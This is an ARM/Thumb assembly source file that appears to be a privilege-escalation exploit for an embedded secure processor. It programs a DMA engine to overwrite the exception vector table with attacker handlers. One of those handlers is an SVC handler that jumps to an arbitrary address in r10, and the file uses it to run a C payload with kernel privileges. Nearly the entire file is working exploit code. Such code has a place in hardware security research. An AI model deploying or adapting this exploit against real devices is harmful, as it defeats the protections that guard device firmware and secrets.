#define WRITE(addr, val) ldr r0, =addr; ldr r1, =val; str r1, [r0]
#define WRITE_SYM(addr, sym) adr r1, sym; ldr r0, =addr; str r1, [r0]
#define WRITE_REG(addr, reg) mov r1, reg; ldr r0, =addr; str r1, [r0]
#define SETUP_FUNC(sym) adr r0, sym+1; str r0, [r1], #0x4
#define POSTCODE(pcode) ldr r0, =pcode; bl postcode

.arch_extension sec
.section .text.boot

.globl _start
.arm
_start:
  ldr sp, =0x73000
  ldr r2, =init+1
  blx r2
  mov sp, r0
  ldr r2, =main+1
  blx r2
  b .

.thumb
init:
  push       {r3, lr}
  ldr        r0, =0x7d000
  mov        r2, sp
  ldr        r1, =0x7f000
  svc        #0x1
  cbnz       r0, .init_fail
  ldr        r0, [sp]
  cbnz       r0, .init_end
.init_fail:
  mov.w      r0, #0xffffffff
  svc        #0x0
.init_end:
  ldr        r0, [sp]
  pop        {r3, pc}

main:
  // We will overwrite the exception vector jump addresses
  // First store the addresses of our handlers in new_vector_table

  adr r1, new_vector_table
  SETUP_FUNC(my_reset_hndlr)
  SETUP_FUNC(my_undef_hndlr)
  SETUP_FUNC(my_svc_hndlr)
  SETUP_FUNC(my_prefetch_hndlr)
  SETUP_FUNC(my_abort_hndlr)

  // Then build the command to copy the new vector table to the original one
  WRITE(0x54000, 0x500011)             // Cmd
  WRITE(0x54004, 0x14)                 // Size
  WRITE_SYM(0x54008, new_vector_table) // Source low
  WRITE(0x5400C, 0x020000)             // Source high
  WRITE(0x54010, 0x20)                 // Destination low
  WRITE(0x54014, 0x020000)             // Destination high
  WRITE(0x54018, 0)                    // Key low
  WRITE(0x5401C, 0)                    // Key high

  // Finally setup DMA
  WRITE(0x3002008, 0x54000) // Program head
  WRITE(0x3002004, 0)       // Program tail
  WRITE(0x3002000, 0x17)    // Program control register

  // We can now jump to whatever address we want with kernel privs by doing an SVC
  // Our SVC handler will jump to r10
retry_loop:
  adr r10, after_privesc+1
  svc 0xFF
  b retry_loop

after_privesc:
  POSTCODE(0x99887766)
  POSTCODE(0x99887766)
  POSTCODE(0x99887766)
  POSTCODE(0x99887766)
  POSTCODE(0x99887766)
  adr r0, postcode+1
  bl c_main
  b .

.balign 4
my_reset_hndlr:
  ldr r0, =0x54000
  mov sp, r0
  ldr r0, =0xDEAD0000
  bl postcode
  b .

.balign 4
my_undef_hndlr:
  push {lr}
  ldr r0, =0xDEAD0001
  bl postcode
  pop {r0}
  bl postcode
  b .

.balign 4
my_svc_hndlr:
  mov pc, r10

.balign 4
my_prefetch_hndlr:
  push {lr}
  ldr r0, =0xDEAD0002
  bl postcode
  pop {r0}
  bl postcode
  b .

.balign 4
my_abort_hndlr:
  push {lr}
  ldr r0, =0xDEAD0003
  bl postcode
  pop {r0}
  bl postcode
  b .

.balign 4
postcode:
  push {r4,lr}
  mov r2, r0
  ldr r4, =0x59bd
  ldr r0, =0xFC000080
  mov r1, 0xFFFD
  mov r3, 4
  blx r4
  ldr r4, =0x100000
99:
  cmp r4, #0
  beq 98f
  sub r4, r4, #1
  b 99b
98:
  pop {r4,pc}

.balign 0x10
new_vector_table:
  .int 0
  .int 0
  .int 0
  .int 0
  .int 0

deadloop:
  b .
  b .
  b .
  b .